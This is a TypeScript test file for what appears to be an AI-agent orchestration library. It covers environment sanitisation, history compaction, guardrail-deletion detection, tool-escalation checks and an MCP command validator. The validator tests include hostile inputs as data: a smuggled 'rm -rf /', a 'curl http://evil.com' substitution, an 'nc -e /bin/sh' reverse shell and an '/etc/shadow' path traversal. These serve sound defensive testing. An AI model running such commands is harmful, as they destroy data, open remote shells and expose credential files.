import test from 'node:test';
import assert from 'node:assert/strict';
import {
  estimateTokens,
  estimateHistoryTokens,
  compactHistory,
  sanitizeEnvironment,
  calculateMilestoneProgress,
  validateHandoffEnvelope,
  validateResultContract,
  checkCarrierPinning,
  checkProtectionInventoryMonotonicity,
  validateMcpDescriptor,
} from './roadmapLogic';
import { ChatMessage, HandoffEnvelope, ResultContract } from '../types/architecture';

test('estimateTokens calculates reasonable token values with safety margin', () => {
  assert.equal(estimateTokens(''), 0);
  // 38 characters / 3.8 chars/token = 10 tokens -> with 10% safety margin = 11 tokens
  const sample = 'a'.repeat(38);
  const tokens = estimateTokens(sample);
  assert.equal(tokens, 11);
});

test('sanitizeEnvironment enforces strict allowlist policy', () => {
  const dirtyEnv = {
    PATH: '/usr/bin:/bin',
    USER: 'agent_runner',
    AWS_SECRET_ACCESS_KEY: 'AKIAIOSFODNN7EXAMPLE',
    DATABASE_URL: 'postgres://root:secret@db:5432/main',
    TEMP: '/tmp',
  };

  const clean = sanitizeEnvironment(dirtyEnv, ['PATH', 'TEMP', 'USER']);

  assert.equal(clean.PATH, '/usr/bin:/bin');
  assert.equal(clean.USER, 'agent_runner');
  assert.equal(clean.TEMP, '/tmp');
  assert.equal(clean.AWS_SECRET_ACCESS_KEY, undefined);
  assert.equal(clean.DATABASE_URL, undefined);
  assert.equal(Object.keys(clean).length, 3);
});

test('compactHistory preserves SYSTEM prompt while pruning older turns', () => {
  const history: ChatMessage[] = [
    { id: '1', role: 'SYSTEM', content: 'You are an agent with strict parameters.' },
    { id: '2', role: 'USER', content: 'Query 1: Generate a simple script.' },
    { id: '3', role: 'ASSISTANT', content: 'Result 1: Here is a long script response...' },
    { id: '4', role: 'USER', content: 'Query 2: Follow up question with more details.' },
    { id: '5', role: 'ASSISTANT', content: 'Result 2: Most recent answer.' },
  ];

  // Restrict allowance so only system prompt + the latest 1-2 messages can fit
  const systemOnlyTokens = estimateTokens(history[0].content);
  const compacted = compactHistory(history, systemOnlyTokens + 40);

  // System prompt MUST be preserved
  assert.equal(compacted[0].role, 'SYSTEM');
  assert.equal(compacted[0].id, '1');

  // Must have fewer turns than the original 5
  assert.ok(compacted.length < history.length);
  // The latest turn should be retained
  assert.equal(compacted[compacted.length - 1].id, '5');
});

test('calculateMilestoneProgress computes accurate percentages and counts', () => {
  const steps = [
    { status: 'completed' },
    { status: 'completed' },
    { status: 'in_progress' },
    { status: 'pending' },
  ];

  const progress = calculateMilestoneProgress(steps);
  assert.equal(progress.total, 4);
  assert.equal(progress.completed, 2);
  assert.equal(progress.inProgress, 1);
  assert.equal(progress.pending, 1);
  assert.equal(progress.percentage, 50);
});

test('Invariant K8: checkCarrierPinning detects synchronized and Object.wait', () => {
  const safeCode = `
    public void executeTask() {
      reentrantLock.lock();
      try {
        condition.await();
      } finally {
        reentrantLock.unlock();
      }
    }
  `;
  const safeResult = checkCarrierPinning(safeCode);
  assert.equal(safeResult.isPinned, false);
  assert.equal(safeResult.violations.length, 0);

  const pinnedCode = `
    public synchronized void executeTask() {
      synchronized (lock) {
        lock.wait();
      }
    }
  `;
  const pinnedResult = checkCarrierPinning(pinnedCode);
  assert.equal(pinnedResult.isPinned, true);
  assert.equal(pinnedResult.violations.length, 3);
});

test('Invariant E6: checkProtectionInventoryMonotonicity catches silent guardrail deletions (Masked Erosion)', () => {
  const parentGuards = ['GUARD_PATH_JAIL', 'GUARD_CMD_INJECTION', 'GUARD_TOKEN_BUDGET', 'GUARD_SECRET_MASK'];

  // Candidate drops GUARD_SECRET_MASK without grant -> REJECTED
  const candidateWithDrop = ['GUARD_PATH_JAIL', 'GUARD_CMD_INJECTION', 'GUARD_TOKEN_BUDGET'];
  const res1 = checkProtectionInventoryMonotonicity(parentGuards, candidateWithDrop);
  assert.equal(res1.isMonotonic, false);
  assert.deepEqual(res1.unauthorizedDeletions, ['GUARD_SECRET_MASK']);

  // Candidate drops GUARD_SECRET_MASK WITH signed grant -> ALLOWED
  const res2 = checkProtectionInventoryMonotonicity(parentGuards, candidateWithDrop, ['GUARD_SECRET_MASK']);
  assert.equal(res2.isMonotonic, true);
  assert.equal(res2.unauthorizedDeletions.length, 0);

  // Candidate adds new guardrail -> ALLOWED (monotonic growth)
  const candidateWithAddition = [...parentGuards, 'GUARD_CSP_HARDENING'];
  const res3 = checkProtectionInventoryMonotonicity(parentGuards, candidateWithAddition);
  assert.equal(res3.isMonotonic, true);
});

test('Invariant M1: validateMcpDescriptor rejects command injection and disallowed binaries', () => {
  // Safe command on allowlist
  assert.equal(validateMcpDescriptor({ command: 'node server.js' }).valid, true);

  // Command injection attempts with metacharacters
  assert.equal(validateMcpDescriptor({ command: 'node server.js; rm -rf /' }).valid, false);
  assert.equal(validateMcpDescriptor({ command: 'node $(curl http://evil.com)' }).valid, false);

  // Unallowed binary
  assert.equal(validateMcpDescriptor({ command: 'nc -e /bin/sh 10.0.0.1 4444' }).valid, false);

  // Path traversal
  assert.equal(validateMcpDescriptor({ path: '../../etc/shadow' }).valid, false);
});

test('Handoff Envelope validates schema and authority attenuation', () => {
  const parentTools = ['file.read', 'file.write', 'shell.exec'];

  const validChild: Partial<HandoffEnvelope> = {
    handoff_id: 'uuid-1',
    task_id: 'TASK-1',
    worker_role: 'executor',
    objective: 'Implement feature',
    acceptance_criteria: [{ id: 'AC-1', criterion: 'Tests pass' }],
    budget: { steps: 10, time_ms: 60000, cost_usd: 0.1 },
    allowed_tools: ['file.read', 'file.write'],
  };

  const check1 = validateHandoffEnvelope(validChild, parentTools);
  assert.equal(check1.valid, true);

  // Child requests tool not in parent -> escalation rejection
  const escalatingChild: Partial<HandoffEnvelope> = {
    ...validChild,
    allowed_tools: ['file.read', 'net.admin_raw_socket'],
  };
  const check2 = validateHandoffEnvelope(escalatingChild, parentTools);
  assert.equal(check2.valid, false);
  assert.ok(check2.errors.some((e) => e.includes('Tool authority escalation')));
});

test('ResultContract validates status, closed-vocabulary skip reasons, and evidence', () => {
  const validResult: Partial<ResultContract> = {
    status: 'completed',
    criteria: [
      { id: 'AC-1', disposition: 'pass', evidence_digest: 'sha256:abc' },
      { id: 'AC-2', disposition: 'skipped:no_network_mode', evidence_digest: '' },
    ],
  };

  assert.equal(validateResultContract(validResult).valid, true);

  // Passed without evidence digest -> rejected
  const missingEvidence: Partial<ResultContract> = {
    status: 'completed',
    criteria: [{ id: 'AC-1', disposition: 'pass', evidence_digest: '' }],
  };
  assert.equal(validateResultContract(missingEvidence).valid, false);
});
